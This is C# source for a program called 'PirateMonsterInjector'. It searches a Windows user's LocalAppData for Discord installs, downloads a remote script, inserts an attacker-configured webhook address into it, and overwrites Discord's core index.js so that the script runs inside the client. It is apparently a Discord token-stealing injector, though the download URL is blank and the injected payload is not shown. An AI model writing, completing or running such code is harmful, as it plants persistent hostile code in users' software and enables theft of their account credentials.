using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace PirateMonsterInjector
{
    class Program
    {
        static List<string> GetDiscords()
        {
            List<string> discords = new List<string>();
            foreach (var item in Directory.GetDirectories(Environment.GetEnvironmentVariable("LocalAppData")))
            {
                if (item.Contains("cord"))
                {
                    discords.Add(item);
                }

            }
            return discords;
        }
        
        static string GetIndex(string direct)
        {
            string path = "";
            try
            {
                //do not ask why i call this variable like this i made an edit and i was too lazy for rename other things
                string localappdata = direct;
                foreach (var dir1 in Directory.GetDirectories(localappdata))
                {
                    if (dir1.Contains("app-"))
                    {

                        foreach (var app in Directory.GetDirectories(dir1))
                        {
                            if (app.Contains("modules"))
                            {
                                foreach (var item in Directory.GetDirectories(app))
                                {
                                    if (item.Contains("discord_desktop_core"))
                                    {
                                        path = item + @"\discord_desktop_core\index.js";
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {

                path = "Discord Not Found";
            }
            return path;
        }

        static void Main(string[] args)
        {
            WebClient client = new WebClient();
            string script = client.DownloadString("");
            foreach (var item in GetDiscords())
            {
                File.WriteAllText(GetIndex(item), script.Replace("%WEBHOOK_LINK%", Settings.Webhook));
                Console.WriteLine(GetIndex(item));
            }
            Console.ReadKey();
        }
    }
}
